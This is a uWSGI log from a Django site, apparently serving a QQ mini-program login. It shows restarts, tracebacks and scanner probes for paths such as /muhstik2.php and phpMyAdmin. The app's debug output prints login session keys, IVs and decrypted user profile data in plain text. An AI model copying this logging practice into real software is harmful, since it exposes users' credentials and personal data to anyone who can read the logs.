*** Starting uWSGI 2.0.18 (64bit) on [Wed May  8 10:12:37 2019] ***
compiled with version: 5.4.0 20160609 on 22 April 2019 13:22:10
os: Linux-4.4.0-130-generic #156-Ubuntu SMP Thu Jun 14 08:53:28 UTC 2018
nodename: VM-0-16-ubuntu
machine: x86_64
clock source: unix
detected number of CPU cores: 1
current working directory: /home/ubuntu/www/new_mysite/mysite
writing pidfile to uwsgi.pid
detected binary path: /home/ubuntu/.local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
chdir() to /home/ubuntu/www/new_mysite/mysite
your processes number limit is 3300
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
Python version: 3.5.2 (default, Nov 12 2018, 13:43:14)  [GCC 5.4.0 20160609]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x1d25d10
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 1306888 bytes (1276 KB) for 10 cores
*** Operational MODE: preforking ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x1d25d10 pid: 1541 (default app)
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 1541)
spawned uWSGI worker 1 (pid: 1543, cores: 1)
spawned uWSGI worker 2 (pid: 1544, cores: 1)
spawned uWSGI worker 3 (pid: 1545, cores: 1)
spawned uWSGI worker 4 (pid: 1546, cores: 1)
spawned uWSGI worker 5 (pid: 1547, cores: 1)
spawned uWSGI worker 6 (pid: 1548, cores: 1)
spawned uWSGI worker 7 (pid: 1549, cores: 1)
spawned uWSGI worker 8 (pid: 1550, cores: 1)
spawned uWSGI worker 9 (pid: 1551, cores: 1)
spawned uWSGI worker 10 (pid: 1552, cores: 1)
TypeError: __call__() takes 2 positional arguments but 3 were given
[pid: 1546|app: 0|req: 1/1] 59.37.125.67 () {52 vars in 822 bytes} [Wed May  8 02:12:42 2019] POST /UserLogin/login => generated 0 bytes in 24 msecs (HTTP/1.1 500) 0 headers in 0 bytes (0 switches on core 0)
Wed May  8 02:20:34 2019 - uWSGI worker 10 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 02:20:34 2019 - uWSGI worker 9 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 02:20:34 2019 - uWSGI worker 8 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 02:20:34 2019 - uWSGI worker 7 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 02:20:34 2019 - uWSGI worker 5 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 02:20:34 2019 - uWSGI worker 6 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 02:20:34 2019 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 02:20:34 2019 - uWSGI worker 2 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 02:20:34 2019 - uWSGI worker 4 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 02:20:34 2019 - uWSGI worker 3 screams: UAAAAAAH my master disconnected: i will kill myself !!!
*** Starting uWSGI 2.0.18 (64bit) on [Wed May  8 10:20:44 2019] ***
compiled with version: 5.4.0 20160609 on 22 April 2019 13:22:10
os: Linux-4.4.0-130-generic #156-Ubuntu SMP Thu Jun 14 08:53:28 UTC 2018
nodename: VM-0-16-ubuntu
machine: x86_64
clock source: unix
detected number of CPU cores: 1
current working directory: /home/ubuntu/www/new_mysite/mysite
writing pidfile to uwsgi.pid
detected binary path: /home/ubuntu/.local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
chdir() to /home/ubuntu/www/new_mysite/mysite
your processes number limit is 3300
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
Python version: 3.5.2 (default, Nov 12 2018, 13:43:14)  [GCC 5.4.0 20160609]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x1fadcd0
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 801944 bytes (783 KB) for 10 cores
*** Operational MODE: preforking ***
Traceback (most recent call last):
  File "./mysite/asgi.py", line 12, in <module>
    application = get_default_application()
  File "/home/ubuntu/.local/lib/python3.5/site-packages/channels/routing.py", line 33, in get_default_application
    module = importlib.import_module(path)
  File "/usr/lib/python3.5/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "./mysite/routing.py", line 1, in <module>
    from channels.auth import AuthMiddlewareStack
  File "/home/ubuntu/.local/lib/python3.5/site-packages/channels/auth.py", line 12, in <module>
    from django.contrib.auth.models import AnonymousUser
  File "/home/ubuntu/.local/lib/python3.5/site-packages/django/contrib/auth/models.py", line 2, in <module>
    from django.contrib.auth.base_user import AbstractBaseUser, BaseUserManager
  File "/home/ubuntu/.local/lib/python3.5/site-packages/django/contrib/auth/base_user.py", line 47, in <module>
    class AbstractBaseUser(models.Model):
  File "/home/ubuntu/.local/lib/python3.5/site-packages/django/db/models/base.py", line 103, in __new__
    app_config = apps.get_containing_app_config(module)
  File "/home/ubuntu/.local/lib/python3.5/site-packages/django/apps/registry.py", line 252, in get_containing_app_config
    self.check_apps_ready()
  File "/home/ubuntu/.local/lib/python3.5/site-packages/django/apps/registry.py", line 135, in check_apps_ready
    raise AppRegistryNotReady("Apps aren't loaded yet.")
django.core.exceptions.AppRegistryNotReady: Apps aren't loaded yet.
unable to load app 0 (mountpoint='') (callable not found or import error)
*** no app loaded. going in full dynamic mode ***
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 2356)
spawned uWSGI worker 1 (pid: 2358, cores: 1)
spawned uWSGI worker 2 (pid: 2359, cores: 1)
spawned uWSGI worker 3 (pid: 2360, cores: 1)
spawned uWSGI worker 4 (pid: 2361, cores: 1)
spawned uWSGI worker 5 (pid: 2362, cores: 1)
spawned uWSGI worker 6 (pid: 2363, cores: 1)
spawned uWSGI worker 7 (pid: 2364, cores: 1)
spawned uWSGI worker 8 (pid: 2365, cores: 1)
spawned uWSGI worker 9 (pid: 2366, cores: 1)
spawned uWSGI worker 10 (pid: 2367, cores: 1)
--- no python application found, check your startup logs for errors ---
[pid: 2362|app: -1|req: -1/1] 59.37.125.67 () {52 vars in 822 bytes} [Wed May  8 02:20:51 2019] POST /UserLogin/login => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
--- no python application found, check your startup logs for errors ---
[pid: 2365|app: -1|req: -1/2] 59.36.119.227 () {38 vars in 640 bytes} [Wed May  8 02:25:41 2019] GET /_404.php => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
--- no python application found, check your startup logs for errors ---
[pid: 2365|app: -1|req: -1/3] 59.36.119.227 () {38 vars in 648 bytes} [Wed May  8 02:26:40 2019] GET /muhstik2.php => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
Wed May  8 02:26:55 2019 - uWSGI worker 8 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 02:26:55 2019 - uWSGI worker 10 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 02:26:55 2019 - uWSGI worker 9 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 02:26:55 2019 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 02:26:55 2019 - uWSGI worker 2 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 02:26:55 2019 - uWSGI worker 7 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 02:26:55 2019 - uWSGI worker 5 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 02:26:55 2019 - uWSGI worker 6 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 02:26:55 2019 - uWSGI worker 4 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 02:26:55 2019 - uWSGI worker 3 screams: UAAAAAAH my master disconnected: i will kill myself !!!
*** Starting uWSGI 2.0.18 (64bit) on [Wed May  8 10:27:06 2019] ***
compiled with version: 5.4.0 20160609 on 22 April 2019 13:22:10
os: Linux-4.4.0-130-generic #156-Ubuntu SMP Thu Jun 14 08:53:28 UTC 2018
nodename: VM-0-16-ubuntu
machine: x86_64
clock source: unix
detected number of CPU cores: 1
current working directory: /home/ubuntu/www/new_mysite/mysite
writing pidfile to uwsgi.pid
detected binary path: /home/ubuntu/.local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
chdir() to /home/ubuntu/www/new_mysite/mysite
your processes number limit is 3300
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
Python version: 3.5.2 (default, Nov 12 2018, 13:43:14)  [GCC 5.4.0 20160609]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x1ed0ce0
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 801944 bytes (783 KB) for 10 cores
*** Operational MODE: preforking ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x1ed0ce0 pid: 2928 (default app)
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 2928)
spawned uWSGI worker 1 (pid: 2931, cores: 1)
spawned uWSGI worker 2 (pid: 2932, cores: 1)
spawned uWSGI worker 3 (pid: 2933, cores: 1)
spawned uWSGI worker 4 (pid: 2934, cores: 1)
spawned uWSGI worker 5 (pid: 2935, cores: 1)
spawned uWSGI worker 6 (pid: 2936, cores: 1)
spawned uWSGI worker 7 (pid: 2937, cores: 1)
spawned uWSGI worker 8 (pid: 2938, cores: 1)
spawned uWSGI worker 9 (pid: 2939, cores: 1)
spawned uWSGI worker 10 (pid: 2940, cores: 1)
TypeError: __call__() takes 2 positional arguments but 3 were given
[pid: 2934|app: 0|req: 1/1] 59.37.125.67 () {52 vars in 822 bytes} [Wed May  8 02:27:12 2019] POST /UserLogin/login => generated 0 bytes in 25 msecs (HTTP/1.1 500) 0 headers in 0 bytes (0 switches on core 0)
Wed May  8 02:29:31 2019 - uWSGI worker 10 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 02:29:31 2019 - uWSGI worker 2 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 02:29:31 2019 - uWSGI worker 9 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 02:29:31 2019 - uWSGI worker 8 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 02:29:31 2019 - uWSGI worker 7 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 02:29:31 2019 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 02:29:31 2019 - uWSGI worker 6 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 02:29:31 2019 - uWSGI worker 5 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 02:29:31 2019 - uWSGI worker 4 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 02:29:31 2019 - uWSGI worker 3 screams: UAAAAAAH my master disconnected: i will kill myself !!!
*** Starting uWSGI 2.0.18 (64bit) on [Wed May  8 10:29:34 2019] ***
compiled with version: 5.4.0 20160609 on 22 April 2019 13:22:10
os: Linux-4.4.0-130-generic #156-Ubuntu SMP Thu Jun 14 08:53:28 UTC 2018
nodename: VM-0-16-ubuntu
machine: x86_64
clock source: unix
detected number of CPU cores: 1
current working directory: /home/ubuntu/www/new_mysite/mysite
writing pidfile to uwsgi.pid
detected binary path: /home/ubuntu/.local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
chdir() to /home/ubuntu/www/new_mysite/mysite
your processes number limit is 3300
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
Python version: 3.5.2 (default, Nov 12 2018, 13:43:14)  [GCC 5.4.0 20160609]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x24a1ce0
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 801944 bytes (783 KB) for 10 cores
*** Operational MODE: preforking ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x24a1ce0 pid: 3159 (default app)
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 3159)
spawned uWSGI worker 1 (pid: 3161, cores: 1)
spawned uWSGI worker 2 (pid: 3162, cores: 1)
spawned uWSGI worker 3 (pid: 3163, cores: 1)
spawned uWSGI worker 4 (pid: 3164, cores: 1)
spawned uWSGI worker 5 (pid: 3165, cores: 1)
spawned uWSGI worker 6 (pid: 3166, cores: 1)
spawned uWSGI worker 7 (pid: 3167, cores: 1)
spawned uWSGI worker 8 (pid: 3168, cores: 1)
spawned uWSGI worker 9 (pid: 3169, cores: 1)
spawned uWSGI worker 10 (pid: 3170, cores: 1)
TypeError: __call__() takes 2 positional arguments but 3 were given
[pid: 3163|app: 0|req: 1/1] 59.37.125.67 () {52 vars in 822 bytes} [Wed May  8 02:29:42 2019] POST /UserLogin/login => generated 0 bytes in 25 msecs (HTTP/1.1 500) 0 headers in 0 bytes (0 switches on core 0)
TypeError: __call__() takes 2 positional arguments but 3 were given
[pid: 3170|app: 0|req: 1/2] 58.251.121.186 () {38 vars in 659 bytes} [Wed May  8 02:35:22 2019] GET /dbadmin/index.php => generated 0 bytes in 24 msecs (HTTP/1.1 500) 0 headers in 0 bytes (0 switches on core 0)
TypeError: __call__() takes 2 positional arguments but 3 were given
[pid: 3170|app: 0|req: 2/3] 181.112.154.194 () {32 vars in 466 bytes} [Wed May  8 02:40:58 2019] GET / => generated 0 bytes in 0 msecs (HTTP/1.1 500) 0 headers in 0 bytes (0 switches on core 0)
TypeError: __call__() takes 2 positional arguments but 3 were given
[pid: 3170|app: 0|req: 3/4] 59.36.119.226 () {38 vars in 666 bytes} [Wed May  8 02:41:58 2019] GET /phpiMyAdmin/index.php => generated 0 bytes in 1 msecs (HTTP/1.1 500) 0 headers in 0 bytes (0 switches on core 0)
invalid request block size: 21573 (max 4096)...skip
invalid request block size: 21573 (max 4096)...skip
TypeError: __call__() takes 2 positional arguments but 3 were given
[pid: 3170|app: 0|req: 4/5] 34.224.71.215 () {34 vars in 499 bytes} [Wed May  8 03:09:05 2019] GET / => generated 0 bytes in 0 msecs (HTTP/1.1 500) 0 headers in 0 bytes (0 switches on core 0)
Wed May  8 03:15:31 2019 - uWSGI worker 10 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 03:15:31 2019 - uWSGI worker 9 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 03:15:31 2019 - uWSGI worker 8 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 03:15:31 2019 - uWSGI worker 7 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 03:15:31 2019 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 03:15:31 2019 - uWSGI worker 3 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 03:15:31 2019 - uWSGI worker 6 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 03:15:31 2019 - uWSGI worker 2 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 03:15:31 2019 - uWSGI worker 5 screams: UAAAAAAH my master disconnected: i will kill myself !!!
Wed May  8 03:15:31 2019 - uWSGI worker 4 screams: UAAAAAAH my master disconnected: i will kill myself !!!
*** Starting uWSGI 2.0.18 (64bit) on [Wed May  8 11:16:07 2019] ***
compiled with version: 5.4.0 20160609 on 22 April 2019 13:22:10
os: Linux-4.4.0-130-generic #156-Ubuntu SMP Thu Jun 14 08:53:28 UTC 2018
nodename: VM-0-16-ubuntu
machine: x86_64
clock source: unix
detected number of CPU cores: 1
current working directory: /home/ubuntu/www/new_mysite/mysite
writing pidfile to uwsgi.pid
detected binary path: /home/ubuntu/.local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
chdir() to /home/ubuntu/www/new_mysite/mysite
your processes number limit is 3300
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
Python version: 3.5.2 (default, Nov 12 2018, 13:43:14)  [GCC 5.4.0 20160609]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x2160ce0
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 801944 bytes (783 KB) for 10 cores
*** Operational MODE: preforking ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x2160ce0 pid: 7073 (default app)
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 7073)
spawned uWSGI worker 1 (pid: 7075, cores: 1)
spawned uWSGI worker 2 (pid: 7076, cores: 1)
spawned uWSGI worker 3 (pid: 7077, cores: 1)
spawned uWSGI worker 4 (pid: 7078, cores: 1)
spawned uWSGI worker 5 (pid: 7079, cores: 1)
spawned uWSGI worker 6 (pid: 7080, cores: 1)
spawned uWSGI worker 7 (pid: 7081, cores: 1)
spawned uWSGI worker 8 (pid: 7082, cores: 1)
spawned uWSGI worker 9 (pid: 7083, cores: 1)
spawned uWSGI worker 10 (pid: 7084, cores: 1)
b'{"encrypt_data":"NpHe9eKjYE0t2qn0PsS/ZwtAsnnl73LO2SAfezGraNThsAuK9zT2FS70R790vD3Bqy6hACX4hPYpEUJ8Y6WBEkVda+f4k8AMEHwlhB1EQEktLbLHS9sGNwb4tXfyCsRMv3BqmvsidtA++1soECxcspEp6qBIN4nfNlTGYB0RoIZFnvVf4roR2FCVFKQxwXnlkJZoh223aS+s+1K6kOK/MXEX+z3lVK1TspoUQsUmmI/HONKrP3PA4QsIK+0bw+CMgwSlbZ3rCH5Wfzd1UfETqZxY9oNKNd920q7Q3e3/p2a5B4mUhKOVEI/1YF49Z3w2PRRe7aGN8coUF/U+Tc3hgBiA3kq3g3fTSj9zSdYziV4GjpHaH+5sv7r5ohDXObYLO0yPt3YW3tRAKWP3jj8SBUg4UPBh7B4Np0aU+IdLK1k=","code":"6198d398cb35c52f79e223c4cf6e4f20","iv":"NTg0ODFjNTU4NTY1NDBlNw=="}'
<class 'bytes'>
<class 'dict'>
从接口获得的信息是
{'errcode': 0, 'unionid': '', 'errmsg': '', 'uin': '', 'openid': '8D7243FFDB3E5B6842BCF66B270B4D65', 'session_key': 'ZUV3WU1CYXcwaHRTN2pKbw=='}
原始获得的session_key是ZUV3WU1CYXcwaHRTN2pKbw==
out decrypt----------------------->
in decrypt----------------------->
开始获取用户信息
原来的session_keyZUV3WU1CYXcwaHRTN2pKbw==
原来的敏感信息NpHe9eKjYE0t2qn0PsS/ZwtAsnnl73LO2SAfezGraNThsAuK9zT2FS70R790vD3Bqy6hACX4hPYpEUJ8Y6WBEkVda+f4k8AMEHwlhB1EQEktLbLHS9sGNwb4tXfyCsRMv3BqmvsidtA++1soECxcspEp6qBIN4nfNlTGYB0RoIZFnvVf4roR2FCVFKQxwXnlkJZoh223aS+s+1K6kOK/MXEX+z3lVK1TspoUQsUmmI/HONKrP3PA4QsIK+0bw+CMgwSlbZ3rCH5Wfzd1UfETqZxY9oNKNd920q7Q3e3/p2a5B4mUhKOVEI/1YF49Z3w2PRRe7aGN8coUF/U+Tc3hgBiA3kq3g3fTSj9zSdYziV4GjpHaH+5sv7r5ohDXObYLO0yPt3YW3tRAKWP3jj8SBUg4UPBh7B4Np0aU+IdLK1k=
原来的iv信息NTg0ODFjNTU4NTY1NDBlNw==
99999999999999999
base64加密后的敏感字段b'6\x91\xde\xf5\xe2\xa3`M-\xda\xa9\xf4>\xc4\xbfg\x0b@\xb2y\xe5\xefr\xce\xd9 \x1f{1\xabh\xd4\xe1\xb0\x0b\x8a\xf74\xf6\x15.\xf4G\xbft\xbc=\xc1\xab.\xa1\x00%\xf8\x84\xf6)\x11B|c\xa5\x81\x12E]k\xe7\xf8\x93\xc0\x0c\x10|%\x84\x1dD@I--\xb2\xc7K\xdb\x067\x06\xf8\xb5w\xf2\n\xc4L\xbfpj\x9a\xfb"v\xd0>\xfb[(\x10,\\\xb2\x91)\xea\xa0H7\x89\xdf6T\xc6`\x1d\x11\xa0\x86E\x9e\xf5_\xe2\xba\x11\xd8P\x95\x14\xa41\xc1y\xe5\x90\x96h\x87m\xb7i/\xac\xfbR\xba\x90\xe2\xbf1q\x17\xfb=\xe5T\xadS\xb2\x9a\x14B\xc5&\x98\x8f\xc78\xd2\xab?s\xc0\xe1\x0b\x08+\xed\x1b\xc3\xe0\x8c\x83\x04\xa5m\x9d\xeb\x08~V\x7f7uQ\xf1\x13\xa9\x9cX\xf6\x83J5\xdfv\xd2\xae\xd0\xdd\xed\xff\xa7f\xb9\x07\x89\x94\x84\xa3\x95\x10\x8f\xf5`^=g|6=\x14^\xed\xa1\x8d\xf1\xca\x14\x17\xf5>M\xcd\xe1\x80\x18\x80\xdeJ\xb7\x83w\xd3J?sI\xd63\x89^\x06\x8e\x91\xda\x1f\xeel\xbf\xba\xf9\xa2\x10\xd79\xb6\x0b;L\x8f\xb7v\x16\xde\xd4@)c\xf7\x8e?\x12\x05H8P\xf0a\xec\x1e\r\xa7F\x94\xf8\x87K+Y'
base64加密后session_keyb'eEwYMBaw0htS7jJo'
8888888888888888888888888888
b'{"avatarUrl":"https://thirdqq.qlogo.cn/qqapp/1108814124/8D7243FFDB3E5B6842BCF66B270B4D65/100","city":"","country":"","gender":0,"language":"zh_CN","nickName":"\xe8\x85\xbe\xe8\xae\xaf\xe4\xbc\x98\xe5\x9b\xbex-lab","openId":"8D7243FFDB3E5B6842BCF66B270B4D65","province":"","unionId":"","watermark":{"appid":"1108814124","timestamp":1557285373}}\r\r\r\r\r\r\r\r\r\r\r\r\r'
解密后的用户敏感信息{"avatarUrl":"https://thirdqq.qlogo.cn/qqapp/1108814124/8D7243FFDB3E5B6842BCF66B270B4D65/100","city":"","country":"","gender":0,"language":"zh_CN","nickName":"腾讯优图x-lab","openId":"8D7243FFDB3E5B6842BCF66B270B4D65","province":"","unionId":"","watermark":{"appid":"1108814124","timestamp":1557285373}}
222222222222
11111111111111111
{'country': '', 'openId': '8D7243FFDB3E5B6842BCF66B270B4D65', 'language': 'zh_CN', 'city': '', 'unionId': '', 'avatarUrl': 'https://thirdqq.qlogo.cn/qqapp/1108814124/8D7243FFDB3E5B6842BCF66B270B4D65/100', 'nickName': '腾讯优图x-lab', 'watermark': {'timestamp': 1557285373, 'appid': '1108814124'}, 'gender': 0, 'province': ''}
<class 'dict'>
out------->change_session
True
<QuerySet [<SessionInfo: 8D7243FFDB3E5B6842BCF66B270B4D65>]>
True
/home/ubuntu/.local/lib/python3.5/site-packages/django/db/models/fields/__init__.py:1421: RuntimeWarning: DateTimeField SessionInfo.create_time received a naive datetime (2019-05-08 03:16:15.861628) while time zone support is active.
  RuntimeWarning)
/home/ubuntu/.local/lib/python3.5/site-packages/django/db/models/fields/__init__.py:1421: RuntimeWarning: DateTimeField SessionInfo.last_vist_time received a naive datetime (2019-05-08 03:16:15.861644) while time zone support is active.
  RuntimeWarning)
[pid: 7078|app: 0|req: 1/1] 59.37.125.67 () {52 vars in 822 bytes} [Wed May  8 03:16:13 2019] POST /UserLogin/login => generated 521 bytes in 2483 msecs (HTTP/1.1 200) 3 headers in 101 bytes (1 switches on core 0)
Not Found: /
[pid: 7084|app: 0|req: 1/2] 184.105.247.194 () {30 vars in 317 bytes} [Wed May  8 03:26:27 2019] GET / => generated 2143 bytes in 311 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
b'{"encrypt_data":"NDwFOakFGLQy9f0M0PqEPQQvYAYgnG6MNewEOweu2Tw62crR/8FYvTB/cTjtRYGLuW0Z+uzDg2Tzexz/EaOG3lJ3e8xxjFH3roon61dXHMF2ME1lgLl+QbpAKD+0yq5HQdH631adhixllIGtMy7A+Q2ysKunFLC8srHZ8HcKegTs+k70uSPqXxXq8mpKo5evcPeLYH6dLBVotU8FCXzamHXYXf5ZB6i5nPcwxXYcVBppqx5lM2LOfvQU5Xh8oFuoVJwG0gpsfRwog0ENNTOUSQKsesFyG6mqyk+xism8KwecZ7QGKu7Mg111QNT4QYvu+sgr71eVONnLuUFwk7NgEOLr+NO5RwXS/KEIbhCchiS/COu3fl/8ZxOMedRBQKop/pfGhoB/cmQny39X83pZXSf50iVuSR/jMr23u4OgoyA=","code":"72376b5e962bc93cbcdc4bac88e7f089","iv":"MTY0YzVmZDBiMGJlNDk5MA=="}'
<class 'bytes'>
<class 'dict'>
从接口获得的信息是
{'errcode': 0, 'unionid': '', 'errmsg': '', 'uin': '', 'openid': '8D7243FFDB3E5B6842BCF66B270B4D65', 'session_key': 'ZUV3WU1CYXcwaHRTN2pKbw=='}
原始获得的session_key是ZUV3WU1CYXcwaHRTN2pKbw==
out decrypt----------------------->
in decrypt----------------------->
开始获取用户信息
原来的session_keyZUV3WU1CYXcwaHRTN2pKbw==
原来的敏感信息NDwFOakFGLQy9f0M0PqEPQQvYAYgnG6MNewEOweu2Tw62crR/8FYvTB/cTjtRYGLuW0Z+uzDg2Tzexz/EaOG3lJ3e8xxjFH3roon61dXHMF2ME1lgLl+QbpAKD+0yq5HQdH631adhixllIGtMy7A+Q2ysKunFLC8srHZ8HcKegTs+k70uSPqXxXq8mpKo5evcPeLYH6dLBVotU8FCXzamHXYXf5ZB6i5nPcwxXYcVBppqx5lM2LOfvQU5Xh8oFuoVJwG0gpsfRwog0ENNTOUSQKsesFyG6mqyk+xism8KwecZ7QGKu7Mg111QNT4QYvu+sgr71eVONnLuUFwk7NgEOLr+NO5RwXS/KEIbhCchiS/COu3fl/8ZxOMedRBQKop/pfGhoB/cmQny39X83pZXSf50iVuSR/jMr23u4OgoyA=
原来的iv信息MTY0YzVmZDBiMGJlNDk5MA==
99999999999999999
base64加密后的敏感字段b"4<\x059\xa9\x05\x18\xb42\xf5\xfd\x0c\xd0\xfa\x84=\x04/`\x06 \x9cn\x8c5\xec\x04;\x07\xae\xd9<:\xd9\xca\xd1\xff\xc1X\xbd0\x7fq8\xedE\x81\x8b\xb9m\x19\xfa\xec\xc3\x83d\xf3{\x1c\xff\x11\xa3\x86\xdeRw{\xccq\x8cQ\xf7\xae\x8a'\xebWW\x1c\xc1v0Me\x80\xb9~A\xba@(?\xb4\xca\xaeGA\xd1\xfa\xdfV\x9d\x86,e\x94\x81\xad3.\xc0\xf9\r\xb2\xb0\xab\xa7\x14\xb0\xbc\xb2\xb1\xd9\xf0w\nz\x04\xec\xfaN\xf4\xb9#\xea_\x15\xea\xf2jJ\xa3\x97\xafp\xf7\x8b`~\x9d,\x15h\xb5O\x05\t|\xda\x98u\xd8]\xfeY\x07\xa8\xb9\x9c\xf70\xc5v\x1cT\x1ai\xab\x1ee3b\xce~\xf4\x14\xe5x|\xa0[\xa8T\x9c\x06\xd2\nl}\x1c(\x83A\r53\x94I\x02\xacz\xc1r\x1b\xa9\xaa\xcaO\xb1\x8a\xc9\xbc+\x07\x9cg\xb4\x06*\xee\xcc\x83]u@\xd4\xf8A\x8b\xee\xfa\xc8+\xefW\x958\xd9\xcb\xb9Ap\x93\xb3`\x10\xe2\xeb\xf8\xd3\xb9G\x05\xd2\xfc\xa1\x08n\x10\x9c\x86$\xbf\x08\xeb\xb7~_\xfcg\x13\x8cy\xd4A@\xaa)\xfe\x97\xc6\x86\x80\x7frd'\xcb\x7fW\xf3zY]'\xf9\xd2%nI\x1f\xe32\xbd\xb7\xbb\x83\xa0\xa3 "
base64加密后session_keyb'eEwYMBaw0htS7jJo'
8888888888888888888888888888
b'{"avatarUrl":"https://thirdqq.qlogo.cn/qqapp/1108814124/8D7243FFDB3E5B6842BCF66B270B4D65/100","city":"","country":"","gender":0,"language":"zh_CN","nickName":"\xe8\x85\xbe\xe8\xae\xaf\xe4\xbc\x98\xe5\x9b\xbex-lab","openId":"8D7243FFDB3E5B6842BCF66B270B4D65","province":"","unionId":"","watermark":{"appid":"1108814124","timestamp":1557286814}}\r\r\r\r\r\r\r\r\r\r\r\r\r'
解密后的用户敏感信息{"avatarUrl":"https://thirdqq.qlogo.cn/qqapp/1108814124/8D7243FFDB3E5B6842BCF66B270B4D65/100","city":"","country":"","gender":0,"language":"zh_CN","nickName":"腾讯优图x-lab","openId":"8D7243FFDB3E5B6842BCF66B270B4D65","province":"","unionId":"","watermark":{"appid":"1108814124","timestamp":1557286814}}
222222222222
11111111111111111
{'country': '', 'openId': '8D7243FFDB3E5B6842BCF66B270B4D65', 'language': 'zh_CN', 'city': '', 'unionId': '', 'avatarUrl': 'https://thirdqq.qlogo.cn/qqapp/1108814124/8D7243FFDB3E5B6842BCF66B270B4D65/100', 'nickName': '腾讯优图x-lab', 'watermark': {'timestamp': 1557286814, 'appid': '1108814124'}, 'gender': 0, 'province': ''}
<class 'dict'>
out------->change_session
True
<QuerySet [<SessionInfo: 8D7243FFDB3E5B6842BCF66B270B4D65>]>
True
